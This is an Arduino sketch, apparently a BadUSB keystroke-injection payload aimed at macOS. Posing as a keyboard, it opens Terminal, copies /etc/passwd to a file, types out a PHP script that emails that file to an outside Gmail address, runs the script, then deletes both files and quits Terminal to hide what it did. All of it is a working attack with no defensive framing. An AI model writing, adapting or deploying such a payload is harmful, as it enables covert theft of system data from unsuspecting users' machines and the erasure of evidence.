
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("cat /etc/passwd > stealpass1.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("vim stealmail1.php");

  delay(500);

  typeKey(KEY_RETURN);
  Keyboard.print("i");
  delay(1000);


  Keyboard.print("#!/usr/bin/php");
  typeKey(KEY_RETURN);
  Keyboard.print("<?php");
  typeKey(KEY_RETURN);
  Keyboard.print("$to = 'pengsec1337@gmail.com';");
  typeKey(KEY_RETURN);
  Keyboard.print("$subject = 'passfile';");
  typeKey(KEY_RETURN);
  Keyboard.print("$body = file_get_contents('./stealpass1.txt');");
  typeKey(KEY_RETURN);
  Keyboard.print("mail($to, $subject, $body);");
  typeKey(KEY_RETURN);
  Keyboard.print("?>");
  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);
  delay(500);
  typeKey(KEY_ESC);
  delay(500);
  Keyboard.print(":wq");
  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print("chmod a+x stealmail1.php");
  typeKey(KEY_RETURN);

  Keyboard.print("./stealmail1.php");
  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("rm stealmail1.php");
  typeKey(KEY_RETURN);

  Keyboard.print("rm stealpass1.txt");
  typeKey(KEY_RETURN);

  delay(1000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('Q');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
